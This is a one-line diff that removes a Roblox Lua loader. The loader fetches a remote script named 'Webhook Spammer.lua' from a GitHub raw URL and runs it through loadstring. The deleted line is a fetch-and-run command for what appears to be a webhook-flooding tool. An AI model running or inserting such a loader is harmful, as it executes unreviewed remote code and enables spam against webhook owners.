@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SeasonalKirito/projects/main/Roblox/Webhook%20Spammer.lua"))()
